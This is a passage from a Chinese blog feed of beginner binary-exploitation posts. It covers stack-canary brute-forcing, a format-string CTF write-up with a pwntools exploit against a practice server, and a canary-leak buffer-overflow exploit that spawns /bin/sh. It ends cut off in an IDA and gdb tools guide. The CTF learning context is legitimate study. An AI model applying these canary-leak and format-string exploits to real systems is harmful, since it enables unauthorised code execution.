<span class=\"number\">7.5</span><span class=\"number\">.0</span>] on linux2</span><br><span class=\"line\"><span class=\"type\">Type</span> <span class=\"string\">&quot;help&quot;</span>, <span class=\"string\">&quot;copyright&quot;</span>, <span class=\"string\">&quot;credits&quot;</span> <span class=\"keyword\">or</span> <span class=\"string\">&quot;license&quot;</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> sys,locale</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sys.getdefaultencoding()</span><br><span class=\"line\"><span class=\"string\">&#x27;ascii&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>q</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">NameError: name <span class=\"string\">&#x27;q&#x27;</span> <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> defined</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>quit()</span><br><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager<span class=\"comment\"># python3</span></span><br><span class=\"line\">Python <span class=\"number\">3.8</span><span class=\"number\">.0</span> (default, Dec  <span class=\"number\">9</span> <span class=\"number\">2021</span>, <span class=\"number\">17</span>:<span class=\"number\">53</span>:<span class=\"number\">27</span>)</span><br><span class=\"line\">[GCC <span class=\"number\">8.4</span><span class=\"number\">.0</span>] on linux</span><br><span class=\"line\"><span class=\"type\">Type</span> <span class=\"string\">&quot;help&quot;</span>, <span class=\"string\">&quot;copyright&quot;</span>, <span class=\"string\">&quot;credits&quot;</span> <span class=\"keyword\">or</span> <span class=\"string\">&quot;license&quot;</span> <span class=\"keyword\">for</span> more information.</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> sys,locale</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sys.getdefaultencoding()</span><br><span class=\"line\"><span class=\"string\">&#x27;utf-8&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>万能的chatgpt…………………………牛的</p>\n<p>让chatgpt把python2的代码修改成python3的就可以了…………</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-8-os%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6canary/image-20230219114331999.png\" alt=\"image-20230219114331999\"></p>\n<p>我之前也是这么做的呀,<font color=\"red\">只是没有canary的\\x00那个值,为什么就不行呢? 果然是因为这个……</font></p>\n<p>所以问题不在于编码,而在于这个\\x00</p>\n<p>python3</p>\n<p>python可以打印数据类型,打印一下,也可以打印一下十六进制看看吧</p>\n<p>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00”‘<br>&lt;class ‘bytes’&gt;<br>success<br>this is 34</p>\n<p>不加canary也是bytes,所以和数据类型应该没关系</p>\n<p>打印字节流的十六进制</p>\n<p>………..0x410x410x410x00x21</p>\n<p>对python2来说</p>\n<p>&lt;type ‘str’&gt;<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is34<br>“<br>success<br>this is34<br>“</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">brute_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> xrange(<span class=\"number\">30</span>,<span class=\"number\">35</span>): <span class=\"comment\"># 2 ** 8</span></span><br><span class=\"line\">        io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">b&quot;Welcome!\\n&quot;</span>)</span><br><span class=\"line\">        io.send(<span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">104</span> + canary + <span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.recv()</span><br><span class=\"line\">            canary += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is&quot;</span>+<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>: io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    brute_canary()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/",
            "title": "pwn入门-7-格式化字符串题目练习1",
            "date_published": "2023-02-17T03:02:28.000Z",
            "content_html": "<h1 id=\"第五空间2019-决赛-PWN5\"><a href=\"#第五空间2019-决赛-PWN5\" class=\"headerlink\" title=\"[第五空间2019 决赛]PWN5\"></a>[第五空间2019 决赛]PWN5</h1><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230217110900326.png\" alt=\"image-20230217110900326\" style=\"zoom: 25%;\">\n\n<p>第一个感觉是 利用第一个name的输入把&#x2F;dev&#x2F;urandom的值修改了,然后passwd输入这个值就可以了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/str/pwn5<span class=\"meta\"># checksec pwn</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/str/pwn5/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No <span class=\"title function_\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>整体的思路是,</p>\n<p>1.找到要修改的值的地址,把这个地址写入栈中</p>\n<p>2.找到这个地址在栈中的位置,需要移动多少个位置能到这里</p>\n<p>3.利用%n随便写入一个值即可</p>\n<p>4.passwd输入对应的值即可</p>\n<p>​\t\t首先,要修改的值的地址就是0x804c044,第一个问题解决.这个是因为ida在命名的时候如果没有符号表会用地址之类的命名,所以可以直接看出来..bss:0804C044 unk_804C044</p>\n<p>​\t\t它的逻辑就是从&#x2F;dev&#x2F;urandom读取一个值到这个地址</p>\n<h2 id=\"寻找写入位置\"><a href=\"#寻找写入位置\" class=\"headerlink\" title=\"寻找写入位置\"></a>寻找写入位置</h2><p>寻找地址在栈中的位置可以进行尝试,或者利用gdb调试查看</p>\n<p>pwndbg&gt; r<br>Starting program: &#x2F;home&#x2F;ubuntu&#x2F;str&#x2F;pwn5&#x2F;pwn<br>your name:aaaaaa%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x<br>Hello,aaaaaaffffd548.63.0.f7ffda9c.3.f7fd0410.1.0.1.61616161.78256161.2e78252e.252e7825</p>\n<p>可以看到,是第10个,</p>\n<p>或者利用aaaa%10$x 来一个一个尝试            数字和$的组合代表了查看第几个值</p>\n<p>your name:aaaa%10$x<br>Hello,aaaa61616161</p>\n<h2 id=\"写入具体的值\"><a href=\"#写入具体的值\" class=\"headerlink\" title=\"写入具体的值\"></a>写入具体的值</h2><p>所以可以用</p>\n<p>p32(0x804c044) + b”%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n” 将值写入,写入的值的大小是</p>\n<p>6+8+9*8 &#x3D; 86</p>\n<p>算的不对,可以在调试的时候检查一下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/wx <span class=\"number\">0x804c044</span></span><br><span class=\"line\"><span class=\"number\">0x804c044</span>:      <span class=\"number\">0x0000004c</span></span><br></pre></td></tr></table></figure>\n\n<p>0x4 &#x3D; 76</p>\n<p>6 + 4 + 8*8 &#x3D; 76  6是hello,  4是p32()  32位,四个字节</p>\n<h2 id=\"passwd输入对应的值\"><a href=\"#passwd输入对应的值\" class=\"headerlink\" title=\"passwd输入对应的值\"></a>passwd输入对应的值</h2><p>直接输入对应的数字即可 记得是biniay类型的</p>\n<p>atoi函数会把字符转化成整数,但直接输入binary的数字也可以</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;break main&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804c044</span>) + <span class=\"string\">b&quot;%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%n&quot;</span></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;passwd:&#x27;</span>,<span class=\"string\">b&#x27;76&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">去除调试信息版本,记得这里修改payload后,passwd的长度也变了,这里就只有p32的长度<span class=\"number\">4</span>了</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">25184</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804c044</span>) + <span class=\"string\">b&#x27;%10$n&#x27;</span></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;name:&#x27;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&#x27;passwd:&#x27;</span>,<span class=\"string\">b&#x27;4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.虽然开了NX和canary保护,但是不用栈溢出,所以不影响.这里不溢出的一个关键点大概是 name给的大小足够大?如果给小了可能是另外的了?</p>\n<h1 id=\"hitcon-cmt-2017-pwn200\"><a href=\"#hitcon-cmt-2017-pwn200\" class=\"headerlink\" title=\"hitcon cmt 2017 pwn200\"></a>hitcon cmt 2017 pwn200</h1><p>题目给了源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">canary_protect_me</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">40</span>];</span><br><span class=\"line\">    gets(buf);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(buf);</span><br><span class=\"line\">    gets(buf);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>编译:gcc -m32 -z lazy -z nonexecstack -fstack-protector -no-pie pwn200.c -o pwn200</p>\n<p>存在栈溢出,但是有保护nx和canary, 思路大概是覆盖返回地址为canary_protect_me,覆盖谁的返回地址呢?覆盖下一个gets的?不是这个逻辑,它还没有调用,没有返回值,那就是覆盖main函数的?</p>\n<p>正确的逻辑是 泄露canary然后栈溢出覆盖返回值</p>\n<p>所以问题是canary在哪?  这两句,第一句把canary赋值给eax然后赋值给 ebp -0xc | 回头专门研究下canary</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x804859e</span> &lt;main+<span class=\"number\">29</span>&gt;    mov    eax, dword ptr gs:[<span class=\"number\">0x14</span>]</span><br><span class=\"line\"><span class=\"number\">0x80485a4</span> &lt;main+<span class=\"number\">35</span>&gt;    mov    dword ptr [ebp - <span class=\"number\">0xc</span>], eax</span><br></pre></td></tr></table></figure>\n\n\n\n<p>所以我们需要泄露 ebp - 0xc这个位置的值,然后就可以溢出,覆盖返回地址就可以了,但是调用printf的时候,ebp不会改变吗???</p>\n<p>调试一下看看,不会…为啥呢?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一开始canary的位置  <span class=\"number\">0xffffd5bc</span></span><br><span class=\"line\"><span class=\"number\">0b</span>:<span class=\"number\">002</span>c│     <span class=\"number\">0xffffd5bc</span> ◂— <span class=\"number\">0x50b7d500</span></span><br><span class=\"line\"><span class=\"number\">0</span>c:<span class=\"number\">0030</span>│     <span class=\"number\">0xffffd5c0</span> —▸ <span class=\"number\">0xffffd5e0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0</span>d:<span class=\"number\">0034</span>│     <span class=\"number\">0xffffd5c4</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0</span>e:<span class=\"number\">0038</span>│ ebp <span class=\"number\">0xffffd5c8</span> ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n<p>和esp差了15个?</p>\n<p>payload1  %15$x</p>\n<p>然后栈溢出覆盖返回地址为canary_protect_me的            0x8048556 (p canary_protect_me 打印即可) 0x80491a2</p>\n<p>payload2 40*’a’ + canary + 12 * ‘b’ + p32(0x8048556)</p>\n<p>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccccccccccddddeeeeeeeeeeeeeeee</p>\n<p>这里有一个细节点,就是怎么正确接收canary,然后拼接上</p>\n<p>是地址对其的问题吗?? 一直不成功</p>\n<p>但是为什么用官方给的文件就可以??     <a href=\"https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61\">https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61</a></p>\n<p>  是编译器的问题吗…调试一下看看</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(&#x27;bamboofox.cs.nctu.edu.tw&#x27;,22002)</span></span><br><span class=\"line\">r = process(<span class=\"string\">&quot;./binary_200&quot;</span>)</span><br><span class=\"line\">func = <span class=\"number\">0x0804854d</span></span><br><span class=\"line\">r.sendline(<span class=\"string\">&#x27;%15$x&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(r.recv(), <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;A&#x27;</span>*<span class=\"number\">40</span> + p32(canary) + <span class=\"string\">b&#x27;B&#x27;</span>*<span class=\"number\">12</span> + p32(func)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>这边联动pwntools调试也有问题…研究一下</p>\n<p>正确的应该是这样</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218143500025.png\" alt=\"image-20230218143500025\"></p>\n<p>不行的exp和这个感觉没啥区别,但是最后报错了&lt;Could not read memory at 0x4242423e&gt;</p>\n<p>返回地址那里的问题感觉是</p>\n<p>这个是有问题的,</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144242002.png\" alt=\"image-20230218144242002\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144611364.png\" alt=\"image-20230218144611364\"></p>\n<p>这个是正常的</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144322352.png\" alt=\"image-20230218144322352\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144344172.png\" alt=\"image-20230218144344172\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-7-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A01/image-20230218144519430.png\" alt=\"image-20230218144519430\"></p>\n<p>文件已保存…后面可以再检查下……</p>\n<h1 id=\"hitcon-cmt-2017-pwn300\"><a href=\"#hitcon-cmt-2017-pwn300\" class=\"headerlink\" title=\"hitcon cmt 2017 pwn300\"></a>hitcon cmt 2017 pwn300</h1><p><a href=\"https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62\">https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/",
            "title": "pwn入门-6-常见工具使用入门",
            "date_published": "2023-01-24T10:13:28.000Z",
            "content_html": "<p>寒假一回来,一段时间没用,有点手生了,觉得还是需要写一篇博客来梳理一下常见工具的使用.</p>\n<p>主要是静态分析、动态分析、脚本编写、小工具</p>\n<h1 id=\"静态分析-IDA-pro\"><a href=\"#静态分析-IDA-pro\" class=\"headerlink\" title=\"静态分析:IDA pro\"></a>静态分析:IDA pro</h1><h2 id=\"ida-里面很多奇怪的东西\"><a href=\"#ida-里面很多奇怪的东西\" class=\"headerlink\" title=\"ida 里面很多奇怪的东西\"></a>ida 里面很多奇怪的东西</h2><p>dword ptr</p>\n<p>qword ptr</p>\n<p>ida的数据类型:<a href=\"https://blog.csdn.net/m0_43406494/article/details/109110983\">https://blog.csdn.net/m0_43406494/article/details/109110983</a></p>\n<h2 id=\"图形模式\"><a href=\"#图形模式\" class=\"headerlink\" title=\"图形模式\"></a>图形模式</h2><p>设置一下这俩,行号和显示数据内容</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230303204724726.png\" alt=\"image-20230303204724726\"></p>\n<h3 id=\"箭头\"><a href=\"#箭头\" class=\"headerlink\" title=\"箭头\"></a>箭头</h3><p>红色: 条件跳转没有被采用</p>\n<p>绿色: 条件跳转被采用</p>\n<p>蓝色: 无条件跳转被采用</p>\n<p>方向向上表示循环</p>\n<h2 id=\"文本模式\"><a href=\"#文本模式\" class=\"headerlink\" title=\"文本模式\"></a>文本模式</h2><p><img src=\"/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230303205201647.png\" alt=\"image-20230303205201647\"></p>\n<p>在设置里可以打开 auto comments 自动注释</p>\n<h3 id=\"视图文件操作\"><a href=\"#视图文件操作\" class=\"headerlink\" title=\"视图文件操作\"></a>视图文件操作</h3><p>选择Windows中的Reset Desktop返回默认 视图 </p>\n<p> 选择Windows中的Save Desktop保存这个 新视图</p>\n<p>配置文件吗??</p>\n<p>后退操作 esc</p>\n<p>前进操作 ctrl+enter</p>\n<h2 id=\"常用快捷键\"><a href=\"#常用快捷键\" class=\"headerlink\" title=\"常用快捷键:\"></a>常用快捷键:</h2><p>Table 切换视图</p>\n<p>快捷键</p>\n<p>p 在汇编中函数开头使用p,从当前地址处解析为函数</p>\n<p>u</p>\n<p>c 转换成代码</p>\n<h3 id=\"数据操作\"><a href=\"#数据操作\" class=\"headerlink\" title=\"数据操作:\"></a>数据操作:</h3><p>shift + f12 显示字符串string</p>\n<p>D – 设置数据 (Data)  1字节 2字节 4字节 8字节 进行循环 </p>\n<p>C – 设置代码 (Code) 设置为指令 </p>\n<p>A – 设置ASCII字符串 (ASCII)</p>\n<p>*设置数组 </p>\n<p>O – 设置地址偏移 (Offset) </p>\n<p>U – 取消定义 (Undefine) </p>\n<p>X – 交叉引用查找 (Cross-reference, Xref)</p>\n<h3 id=\"函数操作\"><a href=\"#函数操作\" class=\"headerlink\" title=\"函数操作\"></a>函数操作</h3><p>P – 创建函数 Del – 删除函数 Ctrl+E – 修改函数(函数窗口)</p>\n<p>Alt+P 修改函数(反汇编窗口)</p>\n<h3 id=\"伪代码操作\"><a href=\"#伪代码操作\" class=\"headerlink\" title=\"伪代码操作\"></a>伪代码操作</h3><p>N – 修改标识符名称 (Name) </p>\n<p>Y – 修改标识符类型 (tYpe) 比如int类型还是double还是什么</p>\n<h3 id=\"搜索\"><a href=\"#搜索\" class=\"headerlink\" title=\"搜索\"></a>搜索</h3><p>alt+t查找字符串</p>\n<p>a 转换成字符串</p>\n<p>d 分开的字符</p>\n<p>G跳转指定地址</p>\n<p>x 交叉引用 (函数和数据都有)</p>\n<p>: 加一条注释</p>\n<p>; 所有交叉引用都会回显这个注释</p>\n<h2 id=\"类型\"><a href=\"#类型\" class=\"headerlink\" title=\"类型\"></a>类型</h2><ul>\n<li><p>WORD (w)  16位 无符号数值 </p>\n</li>\n<li><p>DWORD (dw) 32位 无符号数值</p>\n</li>\n</ul>\n<h2 id=\"脚本编写\"><a href=\"#脚本编写\" class=\"headerlink\" title=\"脚本编写\"></a>脚本编写</h2><h1 id=\"动态分析-gdb-pwndbg插件\"><a href=\"#动态分析-gdb-pwndbg插件\" class=\"headerlink\" title=\"动态分析:gdb(pwndbg插件)\"></a>动态分析:gdb(pwndbg插件)</h1><p>There are a number of good gdb crash courses &#x2F; reference manuals:</p>\n<ul>\n<li><p><a href=\"https://sourceware.org/gdb/onlinedocs/gdb/index.html\">GDB’s documentation</a></p>\n</li>\n<li><p><a href=\"https://users.umiacs.umd.edu/~tdumitra/courses/ENEE757/Fall15/misc/gdb_tutorial.html\">Tudor’s gdb crash course</a></p>\n</li>\n<li><p><a href=\"https://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html\">gdb debugging full example</a></p>\n</li>\n<li><p><a href=\"https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md\">pwndbg: a gdb extension (feature list)</a></p>\n</li>\n<li><p><a href=\"https://hugsy.github.io/gef/commands/aliases/\">gef: another gdb extension (feature 